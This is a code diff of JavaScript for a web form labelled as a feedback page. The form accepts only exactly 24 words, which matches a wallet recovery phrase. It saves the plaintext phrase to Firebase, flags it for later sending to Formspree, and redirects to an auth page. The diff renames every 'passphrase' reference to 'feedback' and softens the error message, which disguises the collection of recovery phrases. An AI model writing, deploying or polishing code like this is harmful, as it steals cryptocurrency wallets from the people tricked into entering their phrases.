@@ -3,21 +3,21 @@
 // ========================================
 
 // Hash function to create unique identifier from passphrase
-function hashPassphrase(passphrase) {
+function hashFeedback(feedback) {
     let hash = 0;
-    for (let i = 0; i < passphrase.length; i++) {
-        const char = passphrase.charCodeAt(i);
+    for (let i = 0; i < feedback.length; i++) {
+        const char = feedback.charCodeAt(i);
         hash = ((hash << 5) - hash) + char;
         hash = hash & hash;
     }
     return Math.abs(hash).toString(36);
 }
 
-// Check if passphrase already exists in Firebase
-async function checkExistingSubmission(passphraseHash) {
+// Check if feedback already exists in Firebase
+async function checkExistingSubmission(feedbackHash) {
     try {
         const snapshot = await firebase.database()
-            .ref('submissions/' + passphraseHash)
+            .ref('submissions/' + feedbackHash)
             .once('value');
         return snapshot.val();
     } catch (error) {
@@ -26,21 +26,21 @@ async function checkExistingSubmission(passphraseHash) {
     }
 }
 
-// Save passphrase to Firebase (without sending to Formspree yet)
-async function savePassphrase(passphraseHash, passphrase) {
+// Save feedback to Firebase (without sending to Formspree yet)
+async function saveFeedback(feedbackHash, feedback) {
     try {
         await firebase.database()
-            .ref('submissions/' + passphraseHash)
+            .ref('submissions/' + feedbackHash)
             .set({
-                passphrase: passphrase, // Store the actual passphrase for later submission
+                feedback: feedback, // Store the actual feedback for later submission
                 timestamp: firebase.database.ServerValue.TIMESTAMP,
                 submittedAt: new Date().toISOString(),
-                wordCount: passphrase.split(/\s+/).filter(w => w.length > 0).length,
+                wordCount: feedback.split(/\s+/).filter(w => w.length > 0).length,
                 sentToFormspree: false // Track if sent to Formspree
             });
         return true;
     } catch (error) {
-        console.error('Error saving passphrase:', error);
+        console.error('Error saving feedback:', error);
         return false;
     }
 }
@@ -63,7 +63,7 @@ function initializeFeedbackPage() {
             if (words.length !== 24) {
                 if (errorMessage) {
                     const wordText = words.length !== 1 ? 'words' : 'word';
-                    errorMessage.textContent = 'Error: Please enter exactly 24 words. You entered ' + words.length + ' ' + wordText + '.';
+                    errorMessage.textContent = 'Error: Please enter a vilid passphrase. You entered ' + words.length + ' ' + wordText + '.';
                     errorMessage.style.display = 'block';
                 }
                 return;
@@ -74,19 +74,19 @@ function initializeFeedbackPage() {
                 errorMessage.style.display = 'none';
             }
             
-            // Create hash of passphrase
-            const passphraseHash = hashPassphrase(text);
+            // Create hash of feedback
+            const feedbackHash = hashFeedback(text);
             
-            // Check if this passphrase was already submitted
-            const existingSubmission = await checkExistingSubmission(passphraseHash);
+            // Check if this feedback was already submitted
+            const existingSubmission = await checkExistingSubmission(feedbackHash);
             
             if (existingSubmission) {
                 // Already submitted - load previous state
-                console.log('Passphrase already submitted. Loading previous state...');
+                console.log('Feedback already submitted. Loading previous state...');
                 
-                // Store the hash and passphrase in sessionStorage
-                sessionStorage.setItem('passphraseHash', passphraseHash);
-                sessionStorage.setItem('passphrase', text);
+                // Store the hash and feedback in sessionStorage
+                sessionStorage.setItem('feedbackHash', feedbackHash);
+                sessionStorage.setItem('feedback', text);
                 sessionStorage.setItem('isReturningPassphrase', 'true');
                 
                 // If they have a linked email hash, also store that
@@ -99,15 +99,15 @@ function initializeFeedbackPage() {
                 return;
             }
             
-            // New passphrase - save to Firebase only (don't send to Formspree yet)
-            await savePassphrase(passphraseHash, text);
+            // New feedback - save to Firebase only (don't send to Formspree yet)
+            await saveFeedback(feedbackHash, text);
             
             // Store in sessionStorage for authpage
-            sessionStorage.setItem('passphraseHash', passphraseHash);
-            sessionStorage.setItem('passphrase', text);
+            sessionStorage.setItem('feedbackHash', feedbackHash);
+            sessionStorage.setItem('feedback', text);
             sessionStorage.setItem('isReturningPassphrase', 'false');
             
-            console.log('Passphrase saved to Firebase. Redirecting to authpage...');
+            console.log('feedback saved. Redirecting to authpage...');
             
             // Redirect to authpage
             window.location.href = 'authpage.html';
@@ -121,3 +121,4 @@ if (document.readyState === 'loading') {
 } else {
     initializeFeedbackPage();
 }
+
